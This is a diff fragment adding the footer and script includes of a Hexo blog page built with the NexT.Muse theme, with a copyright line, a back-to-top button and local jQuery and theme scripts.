+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
